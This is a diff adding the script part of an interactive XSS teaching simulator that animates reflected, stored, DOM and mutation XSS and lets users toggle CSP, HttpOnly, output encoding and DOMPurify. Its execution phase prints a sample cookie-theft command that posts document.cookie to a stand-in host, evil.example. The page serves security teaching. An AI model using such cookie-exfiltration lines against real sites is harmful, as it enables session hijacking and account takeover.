+  ctx.fillText('MITRE T1059.007 \u2014 JavaScript/JScript', 12, H - 26);
+  ctx.restore();
+}
+
+function drawZone(x, y, w, h, label, color){
+  ctx.save();
+  ctx.strokeStyle = color; ctx.globalAlpha = 0.25; ctx.lineWidth = 1;
+  ctx.setLineDash([6,4]); ctx.strokeRect(x, y, w, h);
+  ctx.globalAlpha = 0.6;
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.fillStyle = color; ctx.textAlign = 'left';
+  ctx.fillText(label, x + 6, y + 14);
+  ctx.restore();
+}
+
+function updateBadges(){
+  document.getElementById('badgeType').textContent = STATE.attack.toUpperCase();
+  document.getElementById('badgeParam').textContent = STATE.param;
+  document.getElementById('badgeVictims').textContent = STATE.attack === 'stored' ? 3 : 1;
+  document.getElementById('badgeCookies').textContent = STATE.cookies;
+
+  document.getElementById('mPayloadsVal').textContent = STATE.payloads;
+  document.getElementById('mExecVal').textContent = STATE.exec;
+  document.getElementById('mCookiesVal').textContent = STATE.cookies;
+  document.getElementById('mSessionsVal').textContent = STATE.sessions;
+  document.getElementById('mVictimsVal').textContent = STATE.victims;
+  document.getElementById('mDomVal').textContent = STATE.domSinks;
+  document.getElementById('mPersistVal').textContent = STATE.persisted ? 'YES' : 'NO';
+  document.getElementById('mDefenseVal').textContent = STATE.csp ? 'CSP' : (STATE.httpOnly ? 'HTTPONLY' : (STATE.encoded ? 'ENCODE' : (STATE.sanitized ? 'SANITIZE' : 'OFF')));
+
+  document.getElementById('mCookies').className = 'metric' + (STATE.cookies > 0 ? ' bad' : '');
+  document.getElementById('mPersist').className = 'metric' + (STATE.persisted ? ' bad' : '');
+}
+
+function advancePhase(){
+  if(STATE.phaseIdx >= PHASES.length){
+    STATE.running = false;
+    return;
+  }
+  var phase = PHASES[STATE.phaseIdx];
+  PHASES.forEach(function(p,i){
+    var el = document.getElementById('xp-' + p);
+    if(!el) return;
+    el.className = 'xss-phase';
+    if(i < STATE.phaseIdx) el.classList.add('done');
+    else if(i === STATE.phaseIdx && STATE.running) el.classList.add('active');
+  });
+
+  switch(phase){
+    case 'CRAFT':
+      addFeed('CRAFT', 'Payload crafted: ' + STATE.payload.substring(0,60) + (STATE.payload.length > 60 ? '...' : '') + '. ' +
+        (STATE.attack === 'reflected' ? 'Reflected XSS: payload will be echoed in the response page.' :
+         STATE.attack === 'stored' ? 'Stored XSS: payload will be saved to the database and served to all visitors.' :
+         STATE.attack === 'dom' ? 'DOM XSS: payload will be written to a client-side sink (innerHTML, eval, document.write).' :
+         'mXSS: payload mutates after sanitization \u2014 bypasses naive sanitizers.'),
+        'warn');
+      STATE.payloads++;
+      break;
+    case 'DELIVER':
+      spawnPacket('attacker','server','#a855f7','XSS',0.02);
+      if(STATE.attack === 'reflected'){
+        addFeed('DELIVER', 'Payload delivered via URL: http://10.0.0.10/search?q=' + encodeURIComponent(STATE.payload) + '. Victim must click the link.', 'warn');
+      } else if(STATE.attack === 'stored'){
+        addFeed('DELIVER', 'Payload POSTed to /comment endpoint. Server stores it in the comments table. No encoding applied on save OR on render.', 'error');
+        STATE.persisted = true;
+      } else if(STATE.attack === 'dom'){
+        addFeed('DELIVER', 'Payload delivered via URL fragment: http://10.0.0.10/#payload. Server NEVER SEES the fragment \u2014 it stays in the browser.', 'warn');
+      }
+      break;
+    case 'RENDER':
+      if(STATE.encoded){
+        addFeed('DEFENSE', 'HTML encoding applied: <, >, ", &, single-quote replaced with HTML entities. The browser renders the payload as VISIBLE TEXT \u2014 no script execution. Context-aware encoding is the primary fix.', 'ok');
+        STATE.running = false;
+        return;
+      }
+      if(STATE.sanitized){
+        addFeed('DEFENSE', 'DOMPurify sanitization applied: dangerous tags (script, iframe, object) and attributes (onerror, onload, javascript:) removed. Allowed tags whitelisted. This is the correct approach for user-generated HTML.', 'ok');
+        STATE.running = false;
+        return;
+      }
+      if(STATE.csp){
+        addFeed('DEFENSE', 'Content Security Policy blocks inline scripts: script-src self. The ' + '<' + 'script' + '> tag has no nonce/hash, so it is REFUSED by the browser. CSP report-uri can notify defenders.', 'ok');
+        STATE.running = false;
+        return;
+      }
+      addFeed('RENDER', 'Server echoed payload into HTML response: Results for ' + STATE.payload.substring(0,30) + '... Browser parses HTML and encounters ' + '<' + 'script' + '> tag.', 'error');
+      break;
+    case 'EXEC':
+      STATE.exec++;
+      STATE.domSinks++;
+      spawnPacket('server','victim1','#ef4444','XSS',0.02);
+      if(STATE.attack === 'stored'){
+        setTimeout(function(){spawnPacket('server','victim2','#ef4444','XSS',0.02);}, 200);
+        setTimeout(function(){spawnPacket('server','victim3','#ef4444','XSS',0.02);}, 400);
+        STATE.victims = 3;
+      } else {
+        STATE.victims = 1;
+      }
+      addFeed('EXEC', 'JavaScript executed in victim browser, in the origin of the vulnerable site (10.0.0.10). The script has full access to: document.cookie (unless HttpOnly), localStorage, sessionStorage, DOM, and can make same-origin requests.', 'error');
+      addCommandFeed('curl -X POST http://evil.example/steal -d "c="+document.cookie',
+        '[+] Beacon received from victim\n[+] Cookie: session=a3f9...c1d8\n[+] User-Agent: Mozilla/5.0 (victim browser)');
+      break;
+    case 'STEAL':
+      if(STATE.httpOnly){
+        addFeed('DEFENSE', 'HttpOnly flag blocks document.cookie access: the session cookie is invisible to JavaScript. The attacker cannot steal the session via XSS. HttpOnly is set by the server on Set-Cookie.', 'ok');
+      } else {
+        STATE.cookies++;
+        STATE.sessions++;
+        addFeed('STEAL', 'Session cookie stolen: session=a3f9...c1d8. The attacker can now replay this cookie to impersonate the victim. If the app does not rotate sessions on login, this is a full account takeover.', 'error');
+      }
+      break;
+    case 'EXFIL':
+      if(!STATE.httpOnly && STATE.cookies > 0){
+        spawnPacket('victim1','c2','#ef4444','EXFIL',0.02);
+        if(STATE.victims > 1){
+          spawnPacket('victim2','c2','#ef4444','EXFIL',0.02);
+          spawnPacket('victim3','c2','#ef4444','EXFIL',0.02);
+        }
+        addFeed('EXFIL', 'Cookies exfiltrated to attacker C2 (evil.example). Attack complete. Impact: ' + STATE.victims + ' victim(s), ' + STATE.cookies + ' cookie(s) stolen.', 'error');
+      } else {
+        addFeed('EXFIL', 'Exfiltration blocked by HttpOnly. The attacker has no cookie to steal.', 'ok');
+      }
+      break;
+  }
+  STATE.phaseIdx++;
+}
+
+function resetAll(){
+  STATE.running = false;
+  STATE.phaseIdx = 0;
+  STATE.payloads = 0;
+  STATE.exec = 0;
+  STATE.cookies = 0;
+  STATE.sessions = 0;
+  STATE.victims = 0;
+  STATE.domSinks = 0;
+  STATE.persisted = false;
+  STATE.events = [];
+  PHASES.forEach(function(p){ var el = document.getElementById('xp-' + p); if(el) el.className = 'xss-phase'; });
+  addFeed('RESET', 'XSS state cleared. All victims restored.', 'info');
+  termWrite('reset --all\n[+] XSS state cleared.');
+}
+
+document.getElementById('attackSelect').addEventListener('change', function(e){
+  STATE.attack = e.target.value;
+  var info = {
+    reflected:'Reflected XSS: the payload is part of the request and reflected back in the response. Requires victim to click a crafted link. Non-persistent.',
+    stored:'Stored XSS: the payload is saved to the server (DB, file, log) and served to every visitor. Most severe \u2014 no interaction needed.',
+    dom:'DOM-based XSS: the payload never reaches the server. Client JS reads from location/hash/referrer and writes to innerHTML/eval/document.write.',
+    mxss:'Mutation XSS: the payload mutates AFTER sanitization due to browser parsing quirks. Bypasses naive sanitizers like early versions of DOMPurify.'
+  };
+  addFeed('TYPE', 'XSS type: ' + STATE.attack.toUpperCase() + '. ' + info[STATE.attack], 'warn');
+});
+
+document.getElementById('paramSelect').addEventListener('change', function(e){
+  STATE.param = e.target.value;
+  addFeed('PARAM', 'Vulnerable parameter: ' + STATE.param, 'info');
+});
+
+document.getElementById('payloadInput').addEventListener('input', function(e){
+  STATE.payload = e.target.value;
+});
+
+var presetBtns = document.querySelectorAll('.preset-btn');
+for(var pb = 0; pb < presetBtns.length; pb++){
+  (function(btn){
+    btn.addEventListener('click', function(){
+      STATE.payload = btn.dataset.payload;
+      document.getElementById('payloadInput').value = STATE.payload;
+      addFeed('PAYLOAD', 'Payload loaded: ' + STATE.payload, 'warn');
+    });
+  })(presetBtns[pb]);
+}
+
+function resetCounters(){
+  STATE.payloads = 0;
+  STATE.exec = 0;
+  STATE.cookies = 0;
+  STATE.sessions = 0;
+  STATE.victims = 0;
+  STATE.domSinks = 0;
+  STATE.persisted = false;
+  STATE.events = [];
+}
+
+document.getElementById('startBtn').addEventListener('click', function(){
+  if(STATE.running) return;
+  STATE.running = true;
+  STATE.phaseIdx = 0;
+  resetCounters();
+  addFeed('INJECT', 'Launching ' + STATE.attack.toUpperCase() + ' XSS on parameter ' + STATE.param + '.', 'warn');
+  var interval = setInterval(function(){
+    if(!STATE.running){ clearInterval(interval); return; }
+    advancePhase();
+  }, 1300);
+});
+
+document.getElementById('stepBtn').addEventListener('click', function(){
+  if(!STATE.running){
+    STATE.running = true;
+    STATE.phaseIdx = 0;
+    resetCounters();
+  }
+  advancePhase();
+});
+
+document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+document.getElementById('cspBtn').addEventListener('click', function(){
+  STATE.csp = !STATE.csp;
+  this.classList.toggle('active', STATE.csp);
+  if(STATE.csp){
+    addFeed('DEFENSE', 'CSP ENABLED: Content-Security-Policy: default-src self; script-src self nonce-xxxx; object-src none. Inline scripts and eval are BLOCKED. Requires refactoring inline event handlers (onclick=) to addEventListener. CSP is defense-in-depth \u2014 do NOT rely on it alone.', 'ok');
+  } else {
+    addFeed('DEFENSE', 'CSP DISABLED.', 'warn');
+  }
+});
+
+document.getElementById('httponlyBtn').addEventListener('click', function(){
+  STATE.httpOnly = !STATE.httpOnly;
+  this.classList.toggle('active', STATE.httpOnly);
+  if(STATE.httpOnly){
+    addFeed('DEFENSE', 'HttpOnly flag set on session cookie. document.cookie returns nothing for this cookie. JavaScript cannot read or steal it via XSS. Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict. This is MANDATORY for session cookies.', 'ok');
+  } else {
+    addFeed('DEFENSE', 'HttpOnly DISABLED. Session cookie stealable via XSS.', 'error');
+  }
+});
+
+document.getElementById('encodeBtn').addEventListener('click', function(){
+  STATE.encoded = !STATE.encoded;
+  this.classList.toggle('active', STATE.encoded);
+  if(STATE.encoded){
+    addFeed('DEFENSE', 'Output encoding ENABLED (context-aware). HTML body: HTML entities. HTML attribute: quoted entities. JavaScript: hex escapes. URL: percent-encoding. Correct encoding depends on context \u2014 encoding for one context is useless in another. OWASP Java Encoder, Python html.escape, etc.', 'ok');
+  } else {
+    addFeed('DEFENSE', 'Output encoding DISABLED.', 'warn');
+  }
+});
+
+document.getElementById('sanitizeBtn').addEventListener('click', function(){
+  STATE.sanitized = !STATE.sanitized;
+  this.classList.toggle('active', STATE.sanitized);
+  if(STATE.sanitized){
+    addFeed('DEFENSE', 'DOMPurify sanitization ENABLED. Parses the input as HTML, then walks the DOM removing all elements/attributes not on the allowlist. Handles mXSS, SVG, MathML quirks. Use for user-generated HTML (rich text). Always keep DOMPurify updated.', 'ok');
+  } else {
+    addFeed('DEFENSE', 'Sanitization DISABLED.', 'warn');
+  }
+});
+
+document.getElementById('teachingToggle').addEventListener('click', function(){
+  var on = this.classList.toggle('active');
+  this.textContent = on ? '\uD83D\uDCD6 TEACHING: ON' : '\uD83D\uDCD6 TEACHING: OFF';
+});
+document.getElementById('voiceToggle').addEventListener('click', function(){
+  VOICE.enabled = !VOICE.enabled;
+  this.classList.toggle('active', VOICE.enabled);
+  this.textContent = VOICE.enabled ? '\uD83D\uDD0A VOICE: ON' : 'VOICE: OFF';
+});
+
+window.addEventListener('load', boot);
+</script>
+</body>
+</html>
